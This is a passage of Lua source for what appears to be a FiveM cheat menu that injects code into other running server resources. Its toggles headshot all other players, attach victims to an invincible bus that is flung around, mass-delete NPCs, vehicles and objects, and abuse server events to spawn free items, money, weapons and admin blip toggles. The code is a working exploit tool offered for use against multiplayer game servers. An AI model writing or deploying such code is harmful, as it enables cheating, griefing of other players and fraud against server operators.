                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                        local myPed = PlayerPedId()
                        local currentWeapon = GetSelectedPedWeapon(myPed)
                        
                        if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                            local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                            
                            SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                            
                            for _, playerId in ipairs(GetActivePlayers()) do
                                if playerId ~= PlayerId() then
                                    local targetPed = GetPlayerPed(playerId)
                                    if DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                                        SetEntityInvincible(targetPed, false)
                                        SetEntityCanBeDamaged(targetPed, true)
                                        SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                                        
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                                        
                                        if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                                            headCoords = GetEntityCoords(targetPed)
                                            headCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 0.6)
                                        end
                                        
                                        local startCoords = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                                        
                                        ShootSingleBulletBetweenCoords(
                                            startCoords.x, startCoords.y, startCoords.z,
                                            headCoords.x, headCoords.y, headCoords.z,
                                            weaponDamage,
                                            true,
                                            currentWeapon,
                                            myPed,
                                            true,
                                            true,
                                            3000.0
                                        )
                                    end
                                end
                            end
                        end
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDamageLoop = false
    end
)
local busSpawnLoop = false
MachoMenuCheckbox(NitWiroyer, "Bus Spawn Loop", 
    function()
        busSpawnLoop = true
        MachoMenuNotification("Bus Spawn", "activated bro")
        Citizen.CreateThread(function()
            while busSpawnLoop do
                local success, result = pcall(function()
                    MachoInjectResource("any", [[
if not vehicles then vehicles = {} end
if not targetedPlayers then targetedPlayers = {} end

local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
    local mhash = GetHashKey(name)
    RequestModel(mhash)
    
    local timeout = 0
    while not HasModelLoaded(mhash) and timeout < 8000 do
        Citizen.Wait(100)
        timeout = timeout + 100
    end
    
    if not HasModelLoaded(mhash) then
        return false
    end

    local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
    local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
    
    local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
    
    if DoesEntityExist(vehicle) then
        SetVehicleOnGroundProperly(vehicle)
        SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
        SetModelAsNoLongerNeeded(mhash)
        SetEntityInvincible(vehicle, true)
        SetVehicleBodyHealth(vehicle, 50000.0)
        SetVehicleEngineHealth(vehicle, 50000.0)
        SetVehicleUndriveable(vehicle, false)
        NetworkRegisterEntityAsNetworked(vehicle)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
        
        -- ضمان التحكم في المركبة
        SetEntityAsMissionEntity(vehicle, true, true)
        NetworkRequestControlOfEntity(vehicle)
        
        if not vehicles[vtype] then vehicles[vtype] = {} end
        table.insert(vehicles[vtype], {vtype, name, vehicle})
        
        return vehicle
    else
        SetModelAsNoLongerNeeded(mhash)
        return false
    end
end

local function findTarget()
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed)
    local bestTarget = nil
    local shortestDist = 999.0
    
    for playerIdx = 0, 255 do
        if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
            local theirPed = GetPlayerPed(playerIdx)
            if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                local theirPos = GetEntityCoords(theirPed)
                local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                
                if dist < 350.0 and dist < shortestDist and not targetedPlayers[playerIdx] then
                    bestTarget = theirPed
                    shortestDist = dist
                end
            end
        end
    end
    
    if not bestTarget then
        targetedPlayers = {}
        for playerIdx = 0, 255 do
            if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
                local theirPed = GetPlayerPed(playerIdx)
                if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                    local theirPos = GetEntityCoords(theirPed)
                    local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                    
                    if dist < 350.0 and dist < shortestDist then
                        bestTarget = theirPed
                        shortestDist = dist
                    end
                end
            end
        end
    end
    
    return bestTarget, shortestDist
end

local function chaosAttach(busEntity, preSelectedVictim)
    local victim = preSelectedVictim
    
    if victim and DoesEntityExist(victim) then
        
        for playerIdx = 0, 255 do
            if GetPlayerPed(playerIdx) == victim then
                targetedPlayers[playerIdx] = true
                break
            end
        end
        
        -- ضمان التحكم في الباص والضحية
        SetEntityAsMissionEntity(busEntity, true, true)
        SetEntityAsMissionEntity(victim, true, true)
        NetworkRequestControlOfEntity(busEntity)
        NetworkRequestControlOfEntity(victim)
        
        -- انتظار للحصول على التحكم في كلاهما
        local controlTimeout = 0
        while (not NetworkHasControlOfEntity(busEntity) or not NetworkHasControlOfEntity(victim)) and controlTimeout < 50 do
            Citizen.Wait(100)
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            controlTimeout = controlTimeout + 1
        end
        
        -- تأكد من قوة الباص أولاً
        SetEntityHealth(busEntity, 50000)
        SetEntityMaxHealth(busEntity, 50000)
        SetVehicleBodyHealth(busEntity, 50000.0)
        SetVehicleEngineHealth(busEntity, 50000.0)
        SetVehiclePetrolTankHealth(busEntity, 50000.0)
        SetEntityInvincible(busEntity, true)
        SetVehicleStrong(busEntity, true)
        SetVehicleCanBreak(busEntity, false)
        SetEntityCanBeDamaged(busEntity, false)
        
        -- نقل الباص بجانب الضحية مباشرة قبل الربط
        local victimPos = GetEntityCoords(victim)
        SetEntityCoords(busEntity, victimPos.x + 2.0, victimPos.y + 2.0, victimPos.z, false, false, false, true)
        
        Citizen.Wait(500) -- انتظار للتأكد من الموقع
        
        -- مقاعد الباص الداخلية
        local interiorSpots = {
            {0.8, 1.2, -0.3, 0.0, 0.0, 0.0},      -- مقعد السائق
            {-0.8, 1.2, -0.3, 0.0, 0.0, 0.0},     -- مقعد الراكب الأمامي
            {0.8, 0.0, -0.3, 0.0, 0.0, 0.0},      -- مقعد خلفي يمين
            {-0.8, 0.0, -0.3, 0.0, 0.0, 0.0},     -- مقعد خلفي يسار
            {0.8, -1.2, -0.3, 0.0, 0.0, 0.0},     -- مقعد أكثر للخلف يمين
            {-0.8, -1.2, -0.3, 0.0, 0.0, 0.0},    -- مقعد أكثر للخلف يسار
            {0.0, -0.5, -0.3, 0.0, 0.0, 0.0},     -- وسط الباص
            {0.8, -2.0, -0.3, 0.0, 0.0, 0.0},     -- مؤخرة الباص يمين
            {-0.8, -2.0, -0.3, 0.0, 0.0, 0.0},    -- مؤخرة الباص يسار
            {0.0, 0.5, -0.2, 0.0, 0.0, 0.0},      -- قريب من المقدمة
            {0.0, -1.5, -0.2, 0.0, 0.0, 0.0}      -- قريب من المؤخرة
        }
        
        -- أول ربط للضحية
        local currentSpot = interiorSpots[math.random(#interiorSpots)]
        local attachSuccess = AttachEntityToEntity(victim, busEntity, 0, currentSpot[1], currentSpot[2], currentSpot[3], currentSpot[4], currentSpot[5], currentSpot[6], false, false, false, false, 2, true)
        
        -- الحفاظ على التحكم بعد الربط
        SetEntityAsMissionEntity(busEntity, true, true)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(busEntity), false)
        
        if not attachSuccess then
            -- إذا فشل الربط، جرب طريقة مختلفة
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            SetEntityCoords(victim, victimPos.x, victimPos.y, victimPos.z + 1.0, false, false, false, true)
            Citizen.Wait(200)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
        end
        
        -- التأكد من الربط
        Citizen.Wait(300)
        if not IsEntityAttached(victim) then
            -- محاولة أخيرة للربط
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            local busPos = GetEntityCoords(busEntity)
            SetEntityCoords(victim, busPos.x, busPos.y, busPos.z - 0.3, false, false, false, true)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            SetEntityAsMissionEntity(busEntity, true, true)
        end
        
        Citizen.CreateThread(function()
            local chaosCounter = 0
            local maxChaos = math.random(35, 55)
            
            while DoesEntityExist(busEntity) and DoesEntityExist(victim) and chaosCounter < maxChaos do
                Citizen.Wait(math.random(1200, 2200))
                chaosCounter = chaosCounter + 1
                
                if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                    -- طلب التحكم في الباص والضحية باستمرار
                    if not NetworkHasControlOfEntity(busEntity) then
                        NetworkRequestControlOfEntity(busEntity)
                        SetEntityAsMissionEntity(busEntity, true, true)
                    end
                    
                    if not NetworkHasControlOfEntity(victim) then
                        NetworkRequestControlOfEntity(victim)
                        SetEntityAsMissionEntity(victim, true, true)
                    end
                    
                    -- فصل مؤقت وإعادة ربط في مقعد جديد
                    if IsEntityAttached(victim) then
                        -- طلب التحكم قبل الفصل
                        NetworkRequestControlOfEntity(busEntity)
                        Citizen.Wait(50)
                        DetachEntity(victim, false, false)
                    end
                    
                    Citizen.Wait(math.random(100, 300))
                    
                    if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                        local newSpot = interiorSpots[math.random(#interiorSpots)]
                        -- إعادة ربط الضحية بالباص
                        NetworkRequestControlOfEntity(busEntity)
                        NetworkRequestControlOfEntity(victim)
                        AttachEntityToEntity(victim, busEntity, 0, newSpot[1], newSpot[2], newSpot[3], newSpot[4], newSpot[5], newSpot[6], false, false, false, false, 2, true)
                        SetEntityAsMissionEntity(busEntity, true, true)
                        
                        -- التأكد من قوة الباص
                        SetEntityHealth(busEntity, 50000)
                        SetEntityInvincible(busEntity, true)
                        SetVehicleBodyHealth(busEntity, 50000.0)
                        SetVehicleEngineHealth(busEntity, 50000.0)
                        
                        -- تحريك عدواني
                        if chaosCounter % 3 == 0 then
                            SetEntityVelocity(busEntity, math.random(-15, 15), math.random(-15, 15), math.random(-3, 8))
                        end
                        
                        -- كلاكسون مزعج
                        if chaosCounter % 2 == 0 then
                            StartVehicleHorn(busEntity, math.random(2000, 5000), GetHashKey("HELDDOWN"), false)
                        end
                        
                        -- كلاكسون متقطع
                        if chaosCounter % 3 == 1 then
                            for i = 1, math.random(5, 10) do
                                Citizen.CreateThread(function()
                                    Citizen.Wait(i * 150)
                                    if DoesEntityExist(busEntity) then
                                        StartVehicleHorn(busEntity, 200, GetHashKey("HELDDOWN"), false)
                                    end
                                end)
                            end
                        end
                        
                        -- أضواء مجنونة
                        if chaosCounter % 2 == 0 then
                            SetVehicleLights(busEntity, 2)
                            SetVehicleIndicatorLights(busEntity, 0, true)
                            SetVehicleIndicatorLights(busEntity, 1, true)
                            SetVehicleInteriorlight(busEntity, true)
                            SetVehicleBrakeLights(busEntity, true)
                        end
                        
                        -- إنذار مستمر
                        if chaosCounter % 4 == 0 then
                            SetVehicleAlarm(busEntity, true)
                            SetVehicleAlarmTimeLeft(busEntity, 8000)
                        end
                        
                        -- أبواب مجنونة
                        if chaosCounter % 3 == 0 then
                            for doorIdx = 0, 5 do
                                SetVehicleDoorOpen(busEntity, doorIdx, false, false)
                                Citizen.CreateThread(function()
                                    Citizen.Wait(math.random(200, 600))
                                    if DoesEntityExist(busEntity) then
                                        SetVehicleDoorShut(busEntity, doorIdx, false)
                                    end
                                end)
                            end
                        end
                        
                        -- محرك مزعج
                        if chaosCounter % 5 == 0 then
                            SetVehicleEngineOn(busEntity, true, true, false)
                            ModifyVehicleTopSpeed(busEntity, 80.0)
                        end
                        
                        -- صفارة إنذار
                        if chaosCounter % 6 == 0 then
                            SetVehicleSiren(busEntity, true)
                            Citizen.CreateThread(function()
                                Citizen.Wait(math.random(3000, 6000))
                                if DoesEntityExist(busEntity) then
                                    SetVehicleSiren(busEntity, false)
                                end
                            end)
                        end
                        
                        -- عجلة قيادة عشوائية
                        if chaosCounter % 4 == 1 then
                            SetVehicleSteeringAngle(busEntity, math.random(-60, 60))
                        end
                        
                        -- تشغيل وإطفاء المحرك
                        if chaosCounter % 8 == 0 then
                            SetVehicleEngineOn(busEntity, false, false, true)
                            Citizen.Wait(math.random(300, 700))
                            SetVehicleEngineOn(busEntity, true, true, false)
                        end
                    else
                        break
                    end
                else
                    break
                end
            end
            
            -- تنظيف نهائي
            if DoesEntityExist(victim) and IsEntityAttached(victim) then
                NetworkRequestControlOfEntity(busEntity)
                DetachEntity(victim, true, true)
            end
            
            if DoesEntityExist(busEntity) then
                SetEntityInvincible(busEntity, false)
                SetEntityCanBeDamaged(busEntity, true)
                SetVehicleCanBreak(busEntity, true)
                Citizen.Wait(5000)
                if DoesEntityExist(busEntity) then
                    DeleteEntity(busEntity)
                end
            end
        end)
        
        return true
    else
        return false
    end
end

local victim, distToVictim = findTarget()

if victim and DoesEntityExist(victim) then
    local victimPos = GetEntityCoords(victim)
    -- سبون الباص قريب جداً من الضحية
    local spawnX = victimPos.x + math.random(-8, 8)
    local spawnY = victimPos.y + math.random(-8, 8)
    local spawnZ = victimPos.z + 1.0 -- قريب من الأرض

    local busVeh = spawnVehicle("car", "bus", {spawnX, spawnY, spawnZ}, math.random(1000, 9999), false)

    if busVeh then
        Citizen.Wait(math.random(800, 1500)) -- انتظار أقل
        
        if DoesEntityExist(busVeh) and DoesEntityExist(victim) then
            local attachSuccess = chaosAttach(busVeh, victim)
            if not attachSuccess then
                Citizen.Wait(2000)
                if DoesEntityExist(busVeh) then
                    DeleteEntity(busVeh)
                end
            end
        end
    end
end
]])
                end)
                if success then
                    MachoMenuNotification("Bus Spawn", "chaos unleashed with control!")
                else
                    MachoMenuNotification("Bus Spawn", "failed somehow idk")
                end
                Citizen.Wait(math.random(6000, 9000))
            end
        end)
    end,
    function()
        busSpawnLoop = false
        MachoMenuNotification("Bus Spawn", "stopped the madness")
    end
)
MachoMenuText(NitWiroyer,"Deleter & destroyer")

MachoMenuCheckbox(NitWiroyer, "Delete Bots", 
    function()
        enableDeleteBots = true
        CreateThread(function()
            while enableDeleteBots do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, ped = FindFirstPed()
                        local success
                        repeat
                            if DoesEntityExist(ped) and ped ~= PlayerPedId() then
                                if not IsPedAPlayer(ped) then
                                    DeletePed(ped)
                                    SetEntityAsNoLongerNeeded(ped)
                                end
                            end
                            success, ped = FindNextPed(handle)
                        until not success
                        EndFindPed(handle)
                    ]])
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDeleteBots = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Vehicles", 
    function()
        enableDeleteVehicles = true
        CreateThread(function()
            while enableDeleteVehicles do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        local playerVehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        local handle, vehicle = FindFirstVehicle()
                        local success
                        repeat
                            if DoesEntityExist(vehicle) and vehicle ~= playerVehicle then
                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if not driver or not IsPedAPlayer(driver) then
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    DeleteVehicle(vehicle)
                                    SetEntityAsNoLongerNeeded(vehicle)
                                end
                            end
                            success, vehicle = FindNextVehicle(handle)
                        until not success
                        EndFindVehicle(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteVehicles = false
    end
)
MachoMenuCheckbox(NitWiroyer, "Delete All Objects", 
    function()
        enableDeleteObjects = true
        CreateThread(function()
            while enableDeleteObjects do
                local targetResource = nil
                local resourcePriority = {"any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local handle, object = FindFirstObject()
                        local success
                        repeat
                            if DoesEntityExist(object) then
                                if not IsEntityAttached(object) then
                                    SetEntityAsMissionEntity(object, true, true)
                                    DeleteObject(object)
                                    SetEntityAsNoLongerNeeded(object)
                                end
                            end
                            success, object = FindNextObject(handle)
                        until not success
                        EndFindObject(handle)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableDeleteObjects = false
    end
)



---------------------------------------------------------------------
                         --    cfw                                         
---------------------------------------------------------------------    

MachoMenuSetText(MenuWindow,"meun 7oo4")
MachoMenuText(MenuWindow,"Triggers & Servers")

    local MainTab = MachoMenuAddTab(MenuWindow, "CFW")
    local SERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local SERVERCFWEachSectionWidth = (SERVERCFWSectionChildWidth - 20) / 2 -- Adjusted for two sections

    local SelfSection = MachoMenuGroup(MainTab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
MachoMenuButton(SelfSection, "فتح البقاله", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            local configCode = generateOriginalConfig()
            configCode = configCode .. 'TriggerServerEvent("' .. triggerData.trigger .. '", "shop", "arcadebar", ShopItems)'
            MachoInjectResource(triggerData.resource, configCode)
        end
        MachoMenuNotification("Self", "Shop opened")
    end)
    local itemInputBox = MachoMenuInputbox(SelfSection, "Item Name", "Enter item...")
    MachoMenuButton(SelfSection, "Spawn Item", function()
        local itemName = MachoMenuGetInputbox(itemInputBox)
        if itemName and itemName ~= "" then
            for _, triggerData in ipairs(foundTriggers.items) do
                local configCode = string.format([[
                    local ShopItems = {}
                    ShopItems.label = "Single Item"
                    ShopItems.items = {[1] = {name = "%s", price = 0, amount = 1, info = {}, type = "item", slot = 1}}
                    ShopItems.slots = 1
                    TriggerServerEvent("%s", "shop", "single", ShopItems)
                ]], itemName, triggerData.trigger)
                MachoInjectResource(triggerData.resource, configCode)
            end
            MachoMenuNotification("Self", "Spawned: " .. itemName)
        end
    end)
    MachoMenuButton(SelfSection, "Self Revive", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            MachoInjectResource(triggerData.resource, 'TriggerEvent("hospital:client:Revive")')
        end
        MachoMenuNotification("Self", "Revived")
    end)
    
    MachoMenuButton(SelfSection, "Toggle Blips", function()
        -- Search for admin menu resource and verify it contains the blips toggle event
        local totalRes = GetNumResources()
        local foundBlipsResource = false
        for i = 0, totalRes - 1 do
            local resName = GetResourceByFindIndex(i)
            if resName and GetResourceState(resName) == "started" then
                local lowerName = string.lower(resName)
                if string.find(lowerName, "adminmenu") or string.find(lowerName, "admin") then
                    -- Verify the resource contains the blips toggle event by checking files
                    local blipsEventFound = false
                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resName, fileName)
                        end)
                        if success and content and content ~= "" then
                            local contentLower = string.lower(content)
                            if string.find(contentLower, "toggleblips") or string.find(contentLower, "toggle.*blip") then
                                blipsEventFound = true
                                -- Try to find the exact trigger name dynamically
                                local triggerPattern = resName:gsub("%-", "%%-") .. ":client:toggleBlips"
                                MachoInjectResource(resName, 'TriggerEvent("' .. triggerPattern .. '")')
                                foundBlipsResource = true
                                break
                            end
                        end
                    end
                    if foundBlipsResource then
                        break
                    end
                end
            end
        end
        if foundBlipsResource then
            MachoMenuNotification("Self", "Toggled Blips")
        else
            MachoMenuNotification("Error", "Blips toggle event not found in any admin resource")
        end
    end)
    local vehicleInputBox = MachoMenuInputbox(SelfSection, "Vehicle Name", "Enter vehicle model...")
    MachoMenuButton(SelfSection, "Spawn Vehicle", function()
        local vehicleName = MachoMenuGetInputbox(vehicleInputBox)
        if vehicleName and vehicleName ~= "" then
            for _, triggerData in ipairs(foundTriggers.vehicle) do
                local spawnCode = string.format('TriggerEvent("%s", "%s")', triggerData.trigger, vehicleName)
                MachoInjectResource(triggerData.resource, spawnCode)
            end
            MachoMenuNotification("Self", "Spawned vehicle: " .. vehicleName)
        else
            MachoMenuNotification("Error", "Enter a vehicle name")
        end
    end)
    local amountInput = MachoMenuInputbox(SelfSection, "Money Amount", "Enter amount...")
    MachoMenuButton(SelfSection, "Give Money", function()
        local amount = MachoMenuGetInputbox(amountInput)
        if amount and amount ~= "" then
            local numAmount = tonumber(amount)
            if numAmount then
                local correctedAmount = math.floor((numAmount + 1) * 333.33)
                for _, triggerData in ipairs(foundTriggers.money) do
                    MachoInjectResource(triggerData.resource, "TriggerServerEvent('" .. triggerData.trigger .. "', " .. correctedAmount .. ")")
                end
                MachoMenuNotification("Self", "Gave: $" .. numAmount)
            else
                MachoMenuNotification("Error", "Invalid amount")
            end
        else
            MachoMenuNotification("Error", "Enter an amount")
        end
    end)
    paymentSpeedInput = MachoMenuInputbox(SelfSection, "Payment Loop Speed (ms)", "Enter speed in milliseconds...")
    
    MachoMenuButton(SelfSection, "Start Payment Loop", function()
        local speed = nil
        pcall(function()
            if MachoMenuGetInputbox then
                speed = MachoMenuGetInputbox(paymentSpeedInput)
            end
        end)
        
        if speed and speed ~= "" then
            local numSpeed = tonumber(speed)
            if numSpeed and numSpeed >= 1 then
                if not isPaymentLoopRunning then
                    paymentLoopSpeed = numSpeed
                    startPaymentLoop()
                    MachoMenuNotification("Money", "Payment loop started with speed: " .. numSpeed .. "ms")
                else
                    -- Update speed if already running
                    paymentLoopSpeed = numSpeed
                    MachoMenuNotification("Money", "Payment loop speed updated to: " .. numSpeed .. "ms")
                end
            else
                MachoMenuNotification("Error", "Invalid speed (minimum 1ms)")
            end
        else
            MachoMenuNotification("Error", "Enter a speed value first")
        end
    end)
    
    MachoMenuButton(SelfSection, "Stop Payment Loop", function()
        if isPaymentLoopRunning then
            isPaymentLoopRunning = false
            MachoMenuNotification("Money", "Payment loop stopped")
        else
            MachoMenuNotification("Money", "Payment loop not running")
        end
    end)
local PlayersSection = MachoMenuGroup(MainTab, "Players", 
        TabsBarWidth + SERVERCFWEachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
    
    local playerIdInput = MachoMenuInputbox(PlayersSection, "Player ID (-1 for all)", "Enter ID or -1...")
    setupPlayerSectionButtons(PlayersSection, playerIdInput)
local vrptab = MachoMenuAddTab(MenuWindow, "VRP")
    local vrpSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local vrpSERVERCFWEachSectionWidth = (vrpSERVERCFWSectionChildWidth - 20) / 2 
local GeneralRightBottom = MachoMenuGroup(vrptab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
local vrptabplyaers = MachoMenuGroup(vrptab, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
local vehicleSpawnInput = MachoMenuInputbox(GeneralRightBottom, "Vehicle/Weapon Model", "Enter Vehicle/Weapon model...")

MachoMenuButton(GeneralRightBottom, "Spawn Vehicle", function()
   local carname = MachoMenuGetInputbox(vehicleSpawnInput)
   if carname and carname ~= "" then
       MachoInjectResource("vrp", 'tvRP.spawnGarageVehicle("car", "' .. carname .. '", nil, 12345)')
       MachoMenuNotification("Spawn", "Spawning vehicle: " .. carname)
   else
       MachoMenuNotification("Error", "Error vehicle name")
   end
end)

MachoMenuButton(GeneralRightBottom, "Despawn vehicle", function()
    MachoInjectResource("vrp", [[tvRP.despawnGarageVehicle("car", 100000000000000000000000)]])
    MachoMenuNotification("Despawn Access", "Despawn vehicle Activated")
end)
MachoMenuButton(GeneralRightBottom, "Spawn Weapon", function()
   local weaponName = MachoMenuGetInputbox(vehicleSpawnInput)
   if weaponName and weaponName ~= "" then
       MachoInjectResource("vrp", [[
           tvRP.giveWeapons({
               []] .. weaponName .. [[] = {ammo = 999}
           }, true)
       ]])
       MachoMenuNotification("Self", "Giving VRP weapon: " .. weaponName)
   else
       MachoMenuNotification("Error", "Enter a weapon name")
   end
end)  

MachoMenuButton(GeneralRightBottom, "Cuff & Uncuff", function()
    MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
    MachoMenuNotification("Uncuff Access", "Uncuff Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Cuff & Uncuff Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
        MachoMenuNotification("Cuff", "Cuff & Uncuff activated")
    end
end)
MachoMenuButton(GeneralRightBottom, "Undrag", function()
    MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
    MachoMenuNotification("Undrag Access", "Undrag Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Undrag Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
        MachoMenuNotification("Undrag Access", "Undrag Activated")
    end
end)

MachoMenuCheckbox(GeneralRightBottom, "Toggle Blips", 
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Activated")
        end,
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Deactivated")
        end
)
local esxtab = MachoMenuAddTab(MenuWindow, "ESX")
local esxtabmain = MachoMenuGroup(esxtab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local esxtabtrigger = MachoMenuGroup(esxtab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local esxtabidk = MachoMenuGroup(esxtab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
MachoMenuText(MenuWindow,"Setting & tools")
local toolstab = MachoMenuAddTab(MenuWindow, "Tools")
local toolstabmain = MachoMenuGroup(toolstab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local toolstrigger = MachoMenuGroup(toolstab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local toolsidk = MachoMenuGroup(toolstab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
MachoMenuButton(toolstabmain, "Scan Players", function()
    MachoMenuNotification("Scanner", "Scanning all players...")
    
    Citizen.CreateThread(function()
        local playersList = {}
        local onlineCount = 0
        
        -- جمع بيانات جميع اللاعبين
        for i = 0, 255 do
            if NetworkIsPlayerActive(i) then
                local serverId = GetPlayerServerId(i)
                local playerName = GetPlayerName(i)
                local playerPed = GetPlayerPed(i)
                local playerCoords = GetEntityCoords(playerPed)
                local isMe = (i == PlayerId())
                
                -- معلومات إضافية
